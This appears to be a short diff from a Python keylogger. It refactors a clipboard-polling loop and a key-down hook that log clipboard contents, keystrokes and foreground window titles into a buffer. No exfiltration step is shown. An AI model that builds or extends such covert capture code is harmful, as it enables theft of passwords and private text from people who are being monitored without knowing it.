@@ -103,13 +103,7 @@ def clipboard_listener():
     global text_buffer, CLIP_POLL_RATE
     last_clip = ""
     while True:
-        win32clipboard.OpenClipboard()
-        try:
-            curr_clip = win32clipboard.GetClipboardData(
-                win32clipboard.CF_UNICODETEXT)
-        except:
-            curr_clip = last_clip
-        win32clipboard.CloseClipboard()
+        curr_clip = GetClipboard()
         if curr_clip != last_clip:
             text_buffer += header("START CLIPBOARD")
             text_buffer += curr_clip
@@ -128,7 +122,7 @@ def on_key_down(event):
     """
     global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, __debug__
     modifiers = get_modifiers()
-    curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
+    curr_win = GetForegroundWindowTitle()
     un_char = ToUnicode(event.scan_code)
     unsided_name = event.name[event.name.find(" ")+1:]
     if __debug__:
